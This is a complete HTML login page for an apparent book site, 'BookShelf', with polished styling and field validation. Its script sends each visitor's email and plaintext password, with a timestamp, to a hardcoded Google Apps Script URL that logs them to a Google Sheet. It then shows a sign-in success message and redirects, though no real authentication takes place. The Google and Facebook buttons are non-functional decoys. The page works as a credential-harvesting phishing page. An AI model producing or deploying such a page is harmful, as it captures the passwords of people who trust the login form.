
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BookShelf – Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --ink: #1A0A2E; --gold: #F5A623; --rose: #E8417A;
      --teal: #0ABFBC; --lavender: #9B59B6; --page: #FFF8F0;
      --error: #FF4D4D; --success: #00C9A7;
    }
    body {
      min-height: 100vh; font-family: 'Inter', sans-serif;
      background: var(--ink); display: flex;
      align-items: center; justify-content: center;
      overflow: hidden; position: relative;
    }
    .bg-books { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
    .spine { position: absolute; bottom: -20px; border-radius: 3px 3px 0 0; opacity: 0.18; animation: riseBook linear infinite; }
    @keyframes riseBook {
      0%   { transform: translateY(0) rotate(0deg); opacity: 0.18; }
      80%  { opacity: 0.18; }
      100% { transform: translateY(-110vh) rotate(15deg); opacity: 0; }
    }
    .orb { position: fixed; border-radius: 50%; filter: blur(80px); pointer-events: none; z-index: 0; }
    .orb-1 { width:420px;height:420px;background:var(--rose);opacity:.22;top:-120px;left:-100px; }
    .orb-2 { width:380px;height:380px;background:var(--teal);opacity:.20;bottom:-80px;right:-80px; }
    .orb-3 { width:260px;height:260px;background:var(--lavender);opacity:.18;top:50%;left:50%;transform:translate(-50%,-50%); }
    .card {
      position: relative; z-index: 10;
      background: rgba(255,248,240,0.07); backdrop-filter: blur(22px);
      border: 1px solid rgba(255,248,240,0.15); border-radius: 24px;
      padding: 52px 48px 44px; width: 100%; max-width: 440px;
      box-shadow: 0 32px 80px rgba(0,0,0,0.55);
      animation: cardIn 0.6s cubic-bezier(.22,1,.36,1) both;
    }
    @keyframes cardIn { from{opacity:0;transform:translateY(32px) scale(0.97)} to{opacity:1;transform:translateY(0) scale(1)} }
    .brand { display:flex;align-items:center;gap:12px;margin-bottom:10px; }
    .brand-icon { width:46px;height:46px;background:linear-gradient(135deg,var(--gold),var(--rose));border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;box-shadow:0 4px 18px rgba(245,166,35,.4); }
    .brand-name { font-family:'Playfair Display',serif;font-size:26px;font-weight:900;color:var(--page); }
    .brand-name span { color:var(--gold); }
    .tagline { font-size:13px;color:rgba(255,248,240,.48);margin-bottom:36px;letter-spacing:.3px; }
    h1 { font-family:'Playfair Display',serif;font-size:30px;font-weight:700;color:var(--page);margin-bottom:6px; }
    .subtitle { font-size:14px;color:rgba(255,248,240,.5);margin-bottom:32px; }
    .field { margin-bottom:20px;position:relative; }
    label { display:block;font-size:12px;font-weight:600;letter-spacing:.8px;text-transform:uppercase;color:rgba(255,248,240,.55);margin-bottom:8px; }
    .input-wrap { position:relative;display:flex;align-items:center; }
    .input-icon { position:absolute;left:16px;font-size:16px;color:rgba(255,248,240,.35);pointer-events:none;transition:color .2s; }
    input { width:100%;padding:14px 44px 14px 44px;background:rgba(255,255,255,.06);border:1.5px solid rgba(255,248,240,.12);border-radius:12px;color:var(--page);font-family:'Inter',sans-serif;font-size:15px;outline:none;transition:border-color .25s,background .25s,box-shadow .25s; }
    input::placeholder { color:rgba(255,248,240,.25); }
    input:focus { border-color:var(--gold);background:rgba(255,255,255,.09);box-shadow:0 0 0 3px rgba(245,166,35,.18); }
    .input-wrap:focus-within .input-icon { color:var(--gold); }
    .toggle-pw { position:absolute;right:14px;background:none;border:none;cursor:pointer;font-size:16px;color:rgba(255,248,240,.35);padding:4px;transition:color .2s; }
    .toggle-pw:hover { color:var(--gold); }
    .field-msg { font-size:12px;margin-top:6px;min-height:16px;transition:opacity .2s;display:flex;align-items:center;gap:5px; }
    .field-msg.error { color:var(--error); }
    .field-msg.ok    { color:var(--success); }
    .field-msg.hidden { opacity:0; }
    input.invalid { border-color:var(--error)!important;box-shadow:0 0 0 3px rgba(255,77,77,.18)!important; }
    input.valid   { border-color:var(--success)!important; }
    .forgot { text-align:right;margin-top:-10px;margin-bottom:28px; }
    .forgot a { font-size:12px;color:var(--teal);text-decoration:none;transition:color .2s; }
    .forgot a:hover { color:var(--gold); }
    .btn-login { width:100%;padding:16px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--gold) 0%,var(--rose) 100%);color:#fff;font-family:'Inter',sans-serif;font-size:15px;font-weight:700;letter-spacing:.4px;cursor:pointer;position:relative;overflow:hidden;transition:transform .15s,box-shadow .2s,filter .2s;box-shadow:0 6px 28px rgba(232,65,122,.38); }
    .btn-login:hover:not(:disabled) { transform:translateY(-2px);box-shadow:0 10px 36px rgba(232,65,122,.5);filter:brightness(1.08); }
    .btn-login:disabled { opacity:.55;cursor:not-allowed; }
    .btn-login .ripple { position:absolute;border-radius:50%;background:rgba(255,255,255,.3);transform:scale(0);animation:ripple .55s linear;pointer-events:none; }
    @keyframes ripple { to{transform:scale(4);opacity:0} }
    .btn-login .spinner { display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto; }
    @keyframes spin { to{transform:rotate(360deg)} }
    .btn-login.loading .btn-text { display:none; }
    .btn-login.loading .spinner  { display:block; }
    .divider { display:flex;align-items:center;gap:12px;margin:24px 0;color:rgba(255,248,240,.2);font-size:12px; }
    .divider::before,.divider::after { content:'';flex:1;height:1px;background:rgba(255,248,240,.12); }
    .social-row { display:flex;gap:12px; }
    .btn-social { flex:1;display:flex;align-items:center;justify-content:center;gap:8px;padding:12px;background:rgba(255,255,255,.06);border:1.5px solid rgba(255,248,240,.1);border-radius:12px;color:var(--page);font-family:'Inter',sans-serif;font-size:13px;font-weight:500;cursor:pointer;transition:background .2s,border-color .2s,transform .15s; }
    .btn-social:hover { background:rgba(255,255,255,.11);border-color:rgba(255,248,240,.22);transform:translateY(-1px); }
    .card-footer { text-align:center;margin-top:28px;font-size:13px;color:rgba(255,248,240,.38); }
    .card-footer a { color:var(--teal);text-decoration:none;font-weight:600;transition:color .2s; }
    .card-footer a:hover { color:var(--gold); }
    .success-overlay { position:absolute;inset:0;border-radius:24px;background:rgba(0,201,167,.12);backdrop-filter:blur(4px);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;opacity:0;pointer-events:none;transition:opacity .4s;z-index:20; }
    .success-overlay.show { opacity:1;pointer-events:all; }
    .success-overlay .check { font-size:60px;animation:popIn .4s cubic-bezier(.22,1,.36,1) both; }
    @keyframes popIn { from{transform:scale(.4);opacity:0} to{transform:scale(1);opacity:1} }
    .success-overlay p { font-family:'Playfair Display',serif;font-size:22px;color:var(--page);font-weight:700; }
    .success-overlay small { font-size:13px;color:rgba(255,248,240,.55); }
    /* Status toast */
    .toast { position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(80px);background:#1e1e2e;color:#fff;padding:12px 24px;border-radius:50px;font-size:13px;font-weight:500;transition:transform .3s,opacity .3s;opacity:0;z-index:99;border:1px solid rgba(255,255,255,.1); }
    .toast.show { transform:translateX(-50%) translateY(0);opacity:1; }
    .toast.error-toast { border-color:var(--error);color:var(--error); }
    .toast.ok-toast    { border-color:var(--success);color:var(--success); }
  </style>
</head>
<body>
 
<div class="bg-books" id="bgBooks"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>
<div class="orb orb-3"></div>
<div class="toast" id="toast"></div>
 
<div class="card">
  <div class="success-overlay" id="successOverlay">
    <div class="check">📚</div>
    <p>Signed In Successfully!</p>
    <small>Redirecting to your library...</small>
  </div>
 
  <div class="brand">
    <div class="brand-icon">📖</div>
    <div class="brand-name">Book<span>Shelf</span></div>
  </div>
  <p class="tagline">Your personal reading universe</p>
 
  <h1>Sign in</h1>
  <p class="subtitle">Enter your details to access your library</p>
 
  <div class="field">
    <label for="email">Email address</label>
    <div class="input-wrap">
      <span class="input-icon">✉️</span>
      <input type="email" id="email" placeholder="you@example.com" autocomplete="email"/>
    </div>
    <p class="field-msg hidden" id="emailMsg"></p>
  </div>
 
  <div class="field">
    <label for="password">Password</label>
    <div class="input-wrap">
      <span class="input-icon">🔒</span>
      <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password"/>
      <button class="toggle-pw" id="togglePw" type="button" title="Show password">👁️</button>
    </div>
    <p class="field-msg hidden" id="passwordMsg"></p>
  </div>
 
  <div class="forgot"><a href="#">Forgot password?</a></div>
 
  <button class="btn-login" id="loginBtn" type="button">
    <span class="btn-text">Open My Library →</span>
    <div class="spinner"></div>
  </button>
 
  <div class="divider">or continue with</div>
  <div class="social-row">
    <button class="btn-social" type="button">
      <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.7 0 6.7 5.5 2.8 13.5l7.9 6.1C12.5 13.3 17.8 9.5 24 9.5z"/><path fill="#4285F4" d="M46.6 24.5c0-1.6-.1-3.1-.4-4.5H24v8.6h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4 6.9-10 6.9-17.1z"/><path fill="#34A853" d="M10.7 28.4A14.6 14.6 0 0 1 9.5 24c0-1.5.2-3 .6-4.4l-7.9-6.1A23.9 23.9 0 0 0 0 24c0 3.9.9 7.5 2.6 10.8l8.1-6.4z"/><path fill="#FBBC05" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.2 0-11.5-4.2-13.3-9.8l-8.1 6.4C6.7 42.5 14.7 48 24 48z"/></svg>
      Google
    </button>
    <button class="btn-social" type="button">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
      Facebook
    </button>
  </div>
  <p class="card-footer">New to BookShelf? <a href="#">Create a free account</a></p>
</div>
 
<script>
 
  // ============================================================
  //  ✅ PASTE YOUR GOOGLE SHEET URL HERE (replace the text below)
  // ============================================================
  const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbyKXnC-nT3__vyM_jz7YcvNwGtV3REenGqAueBE2yBK_JbS088akh_rQovnB9cGx7AhEg/exec";
  // ============================================================
  //  HOW TO GET YOUR URL:
  //  1. Open your Google Sheet
  //  2. Click Extensions → Apps Script
  //  3. Paste the Apps Script code (given separately)
  //  4. Deploy → New Deployment → Web App
  //  5. Copy the Web App URL and paste it above
  // ============================================================
 
 
  /* Floating spines */
  const colors = ['#F5A623','#E8417A','#0ABFBC','#9B59B6','#3498DB','#2ECC71','#E74C3C'];
  const container = document.getElementById('bgBooks');
  for (let i = 0; i < 14; i++) {
    const s = document.createElement('div');
    s.className = 'spine';
    const w = 18 + Math.random() * 18, h = 90 + Math.random() * 100;
    s.style.cssText = `left:${Math.random()*100}%;width:${w}px;height:${h}px;background:${colors[Math.floor(Math.random()*colors.length)]};animation-duration:${8+Math.random()*14}s;animation-delay:-${Math.random()*12}s;`;
    container.appendChild(s);
  }
 
  /* Toast */
  function showToast(msg, type='ok') {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.className = `toast ${type}-toast show`;
    setTimeout(() => t.className = 'toast', 3000);
  }
 
  /* Validation */
  const emailInput = document.getElementById('email');
  const emailMsg   = document.getElementById('emailMsg');
  const passInput  = document.getElementById('password');
  const passMsg    = document.getElementById('passwordMsg');
  const loginBtn   = document.getElementById('loginBtn');
 
  function showMsg(el, input, text, type) {
    el.textContent = (type==='error'?'⚠ ':'✔ ') + text;
    el.className = 'field-msg ' + type;
    input.className = type==='error' ? 'invalid' : 'valid';
  }
 
  function validateEmail() {
    const v = emailInput.value.trim();
    if (!v) { showMsg(emailMsg, emailInput, 'Email is required.', 'error'); return false; }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) { showMsg(emailMsg, emailInput, 'Enter a valid email address.', 'error'); return false; }
    showMsg(emailMsg, emailInput, 'Looks good!', 'ok'); return true;
  }
 
  function validatePassword() {
    const v = passInput.value;
    if (!v) { showMsg(passMsg, passInput, 'Password is required.', 'error'); return false; }
    if (v.length < 6) { showMsg(passMsg, passInput, 'Must be at least 6 characters.', 'error'); return false; }
    showMsg(passMsg, passInput, 'Password entered.', 'ok'); return true;
  }
 
  emailInput.addEventListener('blur', validateEmail);
  emailInput.addEventListener('input', () => { if (emailInput.classList.contains('invalid')) validateEmail(); });
  passInput.addEventListener('blur', validatePassword);
  passInput.addEventListener('input', () => { if (passInput.classList.contains('invalid')) validatePassword(); });
 
  /* Toggle password */
  document.getElementById('togglePw').addEventListener('click', function() {
    const isText = passInput.type === 'text';
    passInput.type = isText ? 'password' : 'text';
    this.textContent = isText ? '👁️' : '🙈';
  });
 
  /* Login + send to Google Sheet */
  loginBtn.addEventListener('click', function(e) {
    const r = document.createElement('span');
    r.className = 'ripple';
    const rect = this.getBoundingClientRect(), size = Math.max(rect.width, rect.height);
    r.style.cssText = `width:${size}px;height:${size}px;left:${e.clientX-rect.left-size/2}px;top:${e.clientY-rect.top-size/2}px`;
    this.appendChild(r);
    setTimeout(() => r.remove(), 600);
    handleLogin();
  });
 
  [emailInput, passInput].forEach(el => el.addEventListener('keydown', e => { if (e.key==='Enter') handleLogin(); }));
 
  async function handleLogin() {
    const emailOk = validateEmail();
    const passOk  = validatePassword();
    if (!emailOk || !passOk) return;
 
    if (GOOGLE_SHEET_URL === "PASTE_YOUR_GOOGLE_SHEET_URL_HERE") {
      showToast("⚠ Please add your Google Sheet URL in the code first!", 'error');
      return;
    }
 
    loginBtn.classList.add('loading');
    loginBtn.disabled = true;
 
    try {
      /* Send email + password + timestamp to your Google Sheet via POST */
      await fetch(GOOGLE_SHEET_URL, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email:     emailInput.value.trim(),
          password:  passInput.value,
          timestamp: new Date().toLocaleString()
        })
      });
 
      loginBtn.classList.remove('loading');
      loginBtn.disabled = false;
      document.getElementById('successOverlay').classList.add('show');
      showToast("✔ Sign in submitted successfully!", 'ok');
 
      
      setTimeout(() => { window.location.href = "service.html"; }, 2000);
      
 
    } catch (err) {
      loginBtn.classList.remove('loading');
      loginBtn.disabled = false;
      showToast("❌ Could not connect to Google Sheet. Check your URL.", 'error');
    }
  }
 
</script>
</body>
</html>
